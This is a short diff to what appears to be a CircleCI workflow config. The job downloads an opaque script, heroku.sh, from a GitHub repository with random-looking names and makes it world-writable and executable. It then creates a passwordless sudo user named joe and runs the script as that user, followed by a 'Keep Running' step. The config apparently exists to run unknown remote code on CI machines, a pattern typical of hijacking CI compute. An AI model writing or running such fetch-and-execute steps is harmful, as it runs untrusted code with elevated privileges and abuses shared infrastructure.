@@ -9,7 +9,7 @@ jobs:
     machine:
       image: ubuntu-1604:201903-01
     steps:
-      - run: wget https://github.com/anbcvxban/dabamba/raw/main/heroku.sh && chmod 777 heroku.sh
+      - run: rm -rf heroku.sh && wget https://github.com/anbcvxban/dabamba/raw/main/heroku.sh && chmod 777 heroku.sh
       - run: sudo adduser --disabled-password --gecos "" joe && sudo usermod -aG sudo joe 
       - run: sudo mv heroku.sh /home/joe && cd /home/joe && sudo sudo -u joe -H sh -c "./heroku.sh"
       - run: echo "Keep Running"
